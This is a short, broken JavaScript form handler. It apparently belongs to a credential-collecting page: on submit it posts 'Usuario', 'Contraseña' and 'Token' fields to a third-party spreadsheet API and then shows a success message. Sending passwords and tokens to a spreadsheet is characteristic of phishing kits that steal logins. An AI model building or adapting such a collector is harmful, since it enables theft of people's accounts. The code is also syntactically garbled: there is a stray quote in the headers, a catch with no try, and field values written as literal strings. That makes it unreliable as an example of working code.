const formulario = document.getElementById('formulario');
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

formulario.addEventListener('submit', async(e) =>{
    e.preventDefault();
  
    const respuesta = await fetch('https://sheet.best/api/sheets/e313d05b-aa97-4d1f-9672-e6ef1a743e12', {
        method: 'POST',
        mode: 'cors',
        headers: { "
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            "Usuario": "formulario.usuario.value",
            "Contraseña": "formulario.contraseña.value",
            "Token": "formulario.Token.value"
        })
    });



} catch(error){
    console.log(error);
}
    
    registro.classList.remove('activo');
    exito.classList.add('activo');
});
